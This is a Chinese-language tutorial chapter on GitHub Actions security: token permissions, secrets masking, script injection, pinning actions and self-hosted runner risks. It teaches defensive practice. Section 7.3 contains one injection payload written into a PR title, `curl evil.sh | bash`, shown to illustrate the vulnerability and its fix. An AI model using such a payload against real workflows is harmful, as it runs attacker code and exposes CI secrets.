# 第 7 章：权限、秘密与 fork 安全——CI 的红线章

> 本章目标：GITHUB_TOKEN 最小权限；secrets 的正确使用与脱敏边界；脚本注入的成因与防御；第三方 action 的供应链风险与钉 SHA；self-hosted runner 的边界。本章是安全关键项，必须全部通过。
>
> 关键概念：permissions 最小化、secrets/environment protection、fork PR 不可信代码边界。

---

## 7.1 GITHUB_TOKEN：每个 job 的临时身份证

每个 job 自动获得一个 `GITHUB_TOKEN`（job 结束即失效），权限由 `permissions` 控制：

```yaml
# 顶层：默认全收紧
permissions:
  contents: read

jobs:
  quality: ... # 继承只读
  build-and-push:
    permissions:
      contents: read
      packages: write # 只有这个 job 需要推 GHCR（GitHub Container Registry，GitHub 的镜像仓库）
  deploy:
    permissions:
      contents: read
      id-token: write # 只有这个 job 需要 OIDC（用短期凭据换云访问权，第 9 章）
```

原则（官方 secure use reference）：**顶层设只读默认，按 job 最小提升**。仓库设置里还可把默认权限改为 read-only（Settings → Actions → General → Workflow permissions），双保险。

为什么重要：workflow 里任何一步被攻破（恶意依赖、被投毒的 action），攻击者拿到的就是这个 token。**权限越小，爆炸半径越小**。

## 7.2 secrets：注入、脱敏与边界

```yaml
env:
  DEPLOY_WEBHOOK_URL: ${{ secrets.DEPLOY_WEBHOOK_URL }}
```

- 存储：仓库 Settings → Secrets and variables → Actions；**environment secrets** 更进一步——job 引用 environment 且审批通过后才可用（第 9 章）；
- 脱敏：日志中出现 secret 值会被替换为 `***`，但**脱敏不保证**（变形/编码后可能漏出）——所以官方建议：结构化数据（JSON blob）不要当 secret、派生值要 `::add-mask::` 注册、定期轮换；
- **fork PR 拿不到 secrets**（第 3 章）：这是特性不是 bug；
- 泄露处置：删日志 + **立即轮换**（与阶段 15 镜像秘密同一条原则）。

## 7.3 脚本注入：最容易被忽视的漏洞

```yaml
# 危险：PR 标题直接插进 shell 脚本
- run: echo "标题: ${{ github.event.pull_request.title }}"
```

攻击者把 PR 标题改成 `"; curl evil.sh | bash; "`——表达式在**脚本生成期**被替换，注入的命令随脚本一起执行。防御（官方推荐）：**用中间环境变量**，让不可信值在运行期作为数据传入：

```yaml
- name: Check title
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    if [[ "$TITLE" =~ ^feat ]]; then echo "ok"; fi
```

规则：**任何用户可控的 context（PR 标题/正文/分支名/commit message）都不直接进 `run:`**，一律走 `env:`。

## 7.4 第三方 action：供应链风险

`uses: some/action@v1` 的 tag 是**可变的**——作者（或盗号者）可以把 v1 指向恶意代码，你的 secrets 就进了别人的脚本。防御层级：

1. **优先官方/verified creator**（actions/_、docker/_、pnpm/\*）；
2. **钉全长度 commit SHA**（SHA 是 git 给每个提交算的唯一指纹哈希）：`uses: some/action@<40位sha> # v1.2.3`——不可变；用 Dependabot 的 `package-ecosystem: github-actions` 自动提更新 PR；
3. 更强的新机制：**workflow dependency lockfile**（记录每个 action 及传递依赖的精确 commit 并校验来源），官方称其取代 SHA 钉死；
4. 审计 action 源码：它把 secrets 发去哪了？

本教程示例用主版本 tag（教学可读性）；**生产仓库请钉 SHA 或上 lockfile**——这是明确的升级路径，不是可选项。

## 7.5 self-hosted runner：另一条边界

托管 runner 每次干净 VM；self-hosted runner **持久存在**：不可信代码可以在上面留后门、读其他 job 的 secrets（`ps` 能看到命令行参数）。官方建议：**公开仓库几乎永远不要用 self-hosted runner**；私有仓也要谨慎，用 runner groups 隔离。本教程全部用托管 runner。

## 7.6 常见坑

| 现象                            | 原因                     | 解决                                                       |
| ------------------------------- | ------------------------ | ---------------------------------------------------------- |
| 推 GHCR 报 403                  | job 没给 packages: write | 按 job 提升权限                                            |
| 日志里 secret 没脱敏            | 值被变形/编码            | 派生值 add-mask；结构化数据拆成单个 secret                 |
| PR 标题触发奇怪命令             | 脚本注入                 | 不可信值走 env                                             |
| action 突然行为异常             | tag 被移动               | 钉 SHA / lockfile                                          |
| fork PR 需要 secrets 跑集成测试 | 信任边界设计错误         | 拆 workflow：验证用 pull_request，特权用 workflow_run 审查 |

## 7.7 本章验收清单

- [ ] 三条 workflow 的 permissions 逐 job 最小化，能解释每个写权限的理由；
- [ ] 能演示脚本注入的危险写法与安全写法；
- [ ] 能解释 secrets 脱敏的边界与泄露处置；
- [ ] 知道钉 SHA / lockfile / Dependabot 的升级路径；
- [ ] 能说出 self-hosted runner 的风险与官方建议。

---

上一章：[← 第 6 章：PR 质量门禁](./06-pr-quality-gates.md) ｜ 下一章：[第 8 章：artifacts 与 E2E 报告 →](./08-artifacts-and-e2e.md) ｜ 返回：[教程目录 README](./README.md)
